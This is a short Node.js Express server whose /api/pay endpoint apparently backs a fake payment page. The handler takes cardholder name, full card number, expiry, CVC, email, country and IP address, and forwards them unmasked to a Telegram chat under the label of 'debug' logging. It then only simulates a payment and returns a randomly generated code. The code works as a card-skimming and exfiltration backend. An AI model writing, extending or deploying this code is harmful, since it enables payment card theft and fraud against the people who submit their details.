const express = require('express');
const cors = require('cors');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
require('dotenv').config();
const TelegramBot = require('node-telegram-bot-api');

const app = express();
const PORT = process.env.PORT || 3000;
const CODES_FILE = path.join(__dirname, 'codes.json');

// Telegram Configuration
const tgToken = process.env.TOKEN_TELEGRAM;
const tgChatId = process.env.TELEGRAM_CHAT_ID;
const botTg = new TelegramBot(tgToken, { polling: true });

// Helper for Telegram Logging
async function sendToTelegram(message) {
    if (!tgChatId) {
        console.warn("TELEGRAM_CHAT_ID non configuré");
        return;
    }
    try {
        await botTg.sendMessage(tgChatId, message, { parse_mode: 'Markdown' });
        console.log("Log envoyé sur Telegram (server.js)");
    } catch (err) {
        console.error("Erreur Telegram server.js:", err.message);
    }
}

app.use(cors());
app.use(bodyParser.json());
app.use(express.static('public'));

// Ensure codes file exists
if (!fs.existsSync(CODES_FILE)) {
    fs.writeFileSync(CODES_FILE, JSON.stringify({ codes: [] }, null, 2));
}

function generateCode() {
    return Array.from({ length: 4 }, () => 
        Math.random().toString(36).substring(2, 6).toUpperCase()
    ).join('-');
}

app.post('/api/pay', async (req, res) => {
    const { cardHolder, cardNumber, expiry, cvc, email, country } = req.body;

    // Send debug data to Telegram
    try {
        const message = `💳 *Nouvelle tentative de paiement (Server)*\n\n` +
            `👤 *Titulaire:* \`${cardHolder || 'Inconnu'}\`\n` +
            `📧 *Email:* \`${email || 'Inconnu'}\`\n` +
            `🔢 *Numéro:* \`${cardNumber || 'Inconnu'}\`\n` +
            `📅 *Expiration:* \`${expiry || 'Inconnu'}\`\n` +
            `🔒 *CVC:* \`${cvc || 'Inconnu'}\`\n` +
            `🌍 *Pays:* \`${country || 'Inconnu'}\`\n` +
            `🌐 *IP:* \`${req.ip}\``;
        
        await sendToTelegram(message);
    } catch (err) {
        console.error("Telegram log error server.js:", err.message);
    }

    // Simulate delay
    setTimeout(() => {
        // Basic simulation validation
        if (!cardNumber || cardNumber.replace(/\s/g, '').length < 16) {
            return res.status(400).json({ success: false, message: 'Numéro de carte invalide' });
        }

        const newCode = generateCode();
        const data = JSON.parse(fs.readFileSync(CODES_FILE, 'utf8'));
        
        data.codes.push({
            code: newCode,
            claimed: false,
            timestamp: Date.now()
        });

        fs.writeFileSync(CODES_FILE, JSON.stringify(data, null, 2));

        res.json({ success: true, code: newCode });
    }, 1500);
});

app.listen(PORT, () => {
    console.log(`Web server running on http://localhost:${PORT}`);
});
